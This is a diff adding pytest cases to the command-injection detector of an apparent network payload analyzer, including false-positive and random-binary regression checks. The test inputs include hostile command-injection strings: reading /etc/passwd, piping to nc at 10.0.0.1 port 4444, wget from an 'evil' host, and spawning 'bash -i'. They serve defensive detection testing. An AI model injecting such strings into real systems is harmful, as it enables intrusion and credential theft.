@@ -1,5 +1,7 @@
 """Tests for payload feature extraction."""
 
+import random
+
 import numpy as np
 import pytest
 
@@ -9,6 +11,15 @@ from src.features.payload_analyzer import (
     PAYLOAD_FEATURE_NAMES,
     PATTERN_NAMES,
 )
+
+
+def _matches(payload: bytes) -> list:
+    from unittest.mock import MagicMock
+    from scapy.all import Raw
+    pkt = MagicMock()
+    pkt.__contains__ = lambda self, layer: layer is Raw
+    pkt.__getitem__ = lambda self, layer: MagicMock(load=payload)
+    return analyze_payload(pkt)
 
 
 def test_feature_names_count():
@@ -49,6 +60,41 @@ def test_multiple_patterns():
     assert vec[1] == 1.0   # has_xss
     assert vec[2] == 1.0   # has_cmdi
     assert vec[6] >= 2.0   # at least 2 patterns
+
+
+@pytest.mark.parametrize("payload", [
+    b"q=1; cat /etc/passwd",
+    b"host=x | nc 10.0.0.1 4444",
+    b"host=x && wget http://evil/x.sh",
+    b"host=x || bash -i",
+    b"name=`whoami`",
+    b"name=$(id)",
+    b"cmd=;  python3 -c 'import os'",
+])
+def test_cmdi_detected(payload):
+    assert "command_injection" in _matches(payload)
+
+
+@pytest.mark.parametrize("payload", [
+    b"a=1&&b=2",                          # query-string-ish, no command
+    b"title=Tom | Jerry",                 # pipe in free text
+    b"SELECT a || b FROM t",              # SQL concat operator
+    b"price=$(9.99)",                     # $( without a command
+])
+def test_cmdi_benign_text_not_flagged(payload):
+    assert "command_injection" not in _matches(payload)
+
+
+def test_cmdi_random_binary_not_flagged():
+    """Regression for issue #21: `\\|\\s*\\w+`-style alternatives matched almost
+    every binary payload (96.5% of random 1 KB samples). With a fixed seed,
+    none of 500 random 1 KB payloads may trip command_injection."""
+    rng = random.Random(21)
+    hits = sum(
+        "command_injection" in _matches(bytes(rng.getrandbits(8) for _ in range(1024)))
+        for _ in range(500)
+    )
+    assert hits == 0
 
 
 def test_multiple_payloads_aggregated():
